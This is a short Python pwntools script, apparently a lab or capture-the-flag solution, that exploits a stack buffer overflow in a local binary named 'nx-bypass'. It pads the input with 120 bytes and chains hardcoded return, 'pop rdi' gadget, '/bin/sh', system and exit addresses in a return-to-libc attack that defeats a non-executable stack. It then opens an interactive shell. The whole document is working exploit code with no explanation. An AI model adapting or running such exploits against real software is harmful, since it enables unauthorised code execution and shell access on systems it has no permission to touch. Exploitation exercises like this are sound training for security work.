"""
system=0x00 00 7f ff f7 c5 87 50
exit=0x00 00 7f ff f7 c4 7b a0
bin/sh=0x00 00 7f ff f7 dc b4 2f
pop rdi, ret=0x00 00 00 00 00 40 12 03
ret = 0x00 00 00 00 00 40 12 04
"""

from pwn import *

buf = 'A'*120 + "\x04\x12\x40\x00\x00\x00\x00\x00" \
        + "\x03\x12\x40\x00\x00\x00\x00\x00" \
        + "\x2f\xb4\xdc\xf7\xff\x7f\x00\x00" \
        + "\x50\x87\xc5\xf7\xff\x7f\x00\x00" \
        + "\xa0\x7b\xc4\xf7\xff\x7f\x00\x00"

target = process("./nx-bypass")
target.send(buf)
target.interactive()

